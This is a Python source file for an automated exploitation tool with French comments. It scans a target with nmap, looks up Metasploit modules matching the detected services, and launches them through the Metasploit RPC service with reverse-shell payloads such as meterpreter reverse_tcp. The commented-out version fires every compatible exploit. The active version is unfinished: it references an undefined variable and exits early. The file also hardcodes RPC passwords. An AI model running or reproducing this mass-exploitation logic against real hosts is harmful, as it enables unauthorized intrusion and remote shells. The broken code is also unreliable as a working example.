
import nmap
import re
from pymetasploit3.msfrpc import *
from App.Scan import scan

# class Exploit:
#     def __init__(self):
#         self.level = 0
#         self.scanner = scan.Scan()
#         self.portBy_service_version = []
#         self.mscRPCpassword = "Zhjd5s8OOSH"
#         self.RHOST = ""
#         self.LHOST = "127.0.0.1"
#         self.lport = 4444
#         self.payload = "windows/meterpreter/reverse_tcp"
#         self.SESSION = "23d52cmls98753d"


#     def scan_ports(self,ip_address):
#         """ Scan top ports of the given IP address and detect services """
#         scanner = nmap.PortScanner()
#         try:
#             print("Scanning top ports...")
#             scanner.scan(ip_address, arguments='-Pn')
#             services = {}
#             for port in scanner[ip_address]['tcp']:
#                 print(port)
#                 service_info = scanner[ip_address]['tcp'][port]
#                 services[port] = {'name': service_info['name'], 'product': service_info['product'], 'version': service_info['version']}
#             return services
#         except nmap.PortScannerError as e:
#             print(f"Scan error: {e}")
#             return None
#         except KeyError:
#             print("Host seems down or scan was incomplete.")
#             return None
#     def exploit_services(self,ip_address, services):
#         """ Exploit services using Metasploit based on Nmap results """
#         client = MsfRpcClient('qMUgltsC', port=55553,  ssl=True)  # msfrpcd password
#         session_count = 0
#         for port, info in services.items():
#             service_name = info['name']
#             version = info['product']
#             if version:
#                 query = f'{service_name} {version}'
#             else:
#                 query = service_name
#             try:
#                 compatible_exploits = client.modules.search(query)
#                 for exploit in compatible_exploits:
#                     try:
#                         print(exploit)
#                         e = client.modules.use(exploit["type"], exploit['fullname'])
#                         try:
#                             e['RHOSTS'] = ip_address
#                         except:
#                             pass
#                         try:
#                             e['RPORT'] = port
#                         except:
#                             pass
#                         try:
#                             payload = 'generic/shell_reverse_tcp'
#                             print("4")
#                             e['PAYLOAD'] = payload
#                         except:
#                             pass
#                         e.execute()
#                         session_count += 1
#                         print(f"Exploit launched on {ip_address}:{port} using {exploit['fullname']}")
#                         if session_count >= 10:  # Limit the number of concurrent exploits
#                             break
#                     except TypeError as ex:
#                         print(f"TypeError for exploit {exploit['fullname']}: {ex}")
#                         continue
#             except Exception as ex:
#                 print(f"Error searching exploits for {query}: {ex}")
#                 continue
#     def launcher(self,target):
#         print('hello')
#         ip_address = target[0]
#         #ip_address = "192.168.223.121"
#         services = self.scan_ports(ip_address)
#         if services:
#             print(f"Detected services: {services}")
#             self.exploit_services(ip_address, services)



from App.Scan import scan
import subprocess
import threading
import json
import re
from pymetasploit3.msfrpc import *
import sys

class Exploit:
    def __init__(self):
        self.level = 0
        self.scanner = scan.Scan()
        self.portBy_service_version = []
        self.mscRPCpassword = "qMUgltsC"
        self.RHOST = ""
        self.LHOST = "127.0.0.1"
        self.lport = 4444
        self.payload = "windows/meterpreter/reverse_tcp"
        self.SESSION = "23d52cmls98753d"
    # def init_RPC_MSF(self):
    #     client = MsfRpcClient(password=self.mscRPCpassword,port=55552)
    #     rpc_service = client.services.service('msgrpc')
    #     rpc_service.start()
        
      
    #     # Vérifier si le service est démarré
    #     if rpc_service.state == 'running':
    #         print("Le serveur RPC Metasploit a démarré avec succès.")
    #     else:
    #         print("Erreur lors du démarrage du serveur RPC Metasploit.")

    def init_RPC_MSF(self):
        print("Initialisation of RPC server")
        command = ["msfrpcd", "-P", self.mscRPCpassword]
        subprocess.run(command)
        # process = subprocess.Popen(["msfrpcd", "-P",self.mscRPCpassword], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        client = MsfRpcClient(self.mscRPCpassword, port=55553,  ssl=True)
        # client = MsfRpcClient("qMUgltsC",port=55552)
        print("Starting client")
        print(client)
        sys.exit()
        


    def launcher(self,target):
        self.init_RPC_MSF()
        # if self.init_RPC_MSF():
        #     client = MsfRpcClient(self.mscRPCpassword, port=55552)
        print("Starting auto exploit...")
        #Première étape récupération des ports/versions
        self.RHOST = target[0]
        target[1] = "-v"
        print("Scan open port and get service/version...")
        services = self.scanner.getServices(target)
        for port in services[target[0]]["ports"]:
            if port["state"] == "open":
                portid = ""
                product = ""
                version = ""

                if "portid" in port:
                    portid = port['portid']
                if "product" in port['service'] :
                    product = port['service']['product']
                if "version" in port['service'] :
                    version = port['service']['version']
                                
                
                if portid != "" and product != "" and version != "":
                    data = {
                        "ip" : target[0],
                        "port" : portid,
                        "product" : product,
                        "version" : version
                    }
                    self.portBy_service_version.append(data)
        self.search_exploit()

    def search_exploit(self):
        commands = []
        threads = []
        for result in self.portBy_service_version:
            version = result["version"].split(" ")[0].replace("X","1")
            command = 'search name:'+result["product"].split(" ")[0]+' version:'+version
            commands.append(command)
            # self.execMsf_search(command)

        
        print("Using metasploit to find exploit...")
        for command in commands:
            # Create a thread for each data item
            thread = threading.Thread(target=self.execMsf_search, args=(command,))
            thread.start()
            threads.append(thread)

        # Wait for all threads to finish
        for thread in threads:
            thread.join()
       
        self.execMsf_exploit()

    def execMsf_search(self,command):
        try:
            # client = MsfRpcClient('nO1eLzHx', port=55552)
            session_count = 0
            # Run the msfconsole command with the provided command as an argument
            process = subprocess.Popen(["msfconsole", "-q", "-x" ,command], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            stdout, stderr = process.communicate()

            # Print the output and error messages
            output = stdout.split("\n")
            found = False
            count = 0
            for i in range(7,len(output)):
                
                if "excellent" in output[i] or "normal" in output[i] :
                    
                    # if "excellent" in output[i] :
                    result_exploit = output[i].split(" ")
         
                    for data in self.portBy_service_version:
                        
                        product_name = command.split(":")[1].replace(" version","")
                        for v in data:
                            if product_name in data["product"]:
                                for res in result_exploit:
                                    if res.count("/") >=2:
                                        indice = "exploit_name_"+str(count)
                                        data[indice] = str(res)
                                        count+=1


            
                                
            
            # Print the output and error messages
            process.kill()
        except Exception as e:
            if "changed size" in str(e):
                pass
            else:
                print("Error : " ,e)


    def execMsf_exploit(self):
        # print(self.portBy_service_version)
        # if  "exploit_name" not in self.portBy_service_version:
        #     print("Target seem to be no vulnerable")
        #     return
        # print("")
        # print(json.dumps(self.portBy_service_version,indent=4))
        process = subprocess.Popen(["netstat", "-tulpn"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        stdout, stderr = process.communicate()
        print(stdout)
        print("Try to exploit...")
        client = MsfRpcClient(self.mscRPCpassword, port=55553)
        print(client)
        
        session_count = 0
        for data in self.portBy_service_version:
            for k,v in data.items():
                if "exploit_name_" in k:
                    client.modules.use('exploit', module_name)
        
        # for port, info in services.items():
        #     service_name = info['name']
        #     version = info['product']
        #     query = f'{service_name} {version}' if version else service_name
        #     try:
        #         compatible_exploits = client.modules.search(query)
        #         for exploit in compatible_exploits:
        #             module_type = exploit['type']
        #             module_name = exploit['fullname']
        #             if module_type == 'exploit':
        #                 try:
        #                     e = client.modules.use('exploit', module_name)
        #                     e['RHOSTS'] = ip_address
        #                     e['RPORT'] = port
        #                     if 'PAYLOAD' in e.execute.payloads:
        #                         e['PAYLOAD'] = 'generic/shell_reverse_tcp'
        #                     output = e.execute()
        #                     print(f"Exploit {module_name} launched on {ip_address}:{port}, result: {output}")
        #                     session_count += 1
        #                     if session_count >= 10:  # Limit the number of concurrent exploits
        #                         break
        #                 except KeyError:
        #                     print(f"Module {module_name} does not support RHOSTS or PAYLOAD.")
        #                 except TypeError as ex:
        #                     print(f"TypeError using {module_name}: {ex}")
        #             else:
        #                 print(f"Skipping non-exploit module {module_name}.")
        #     except Exception as ex:
        #         print(f"Error searching exploits for {query}: {ex}")
        #         continue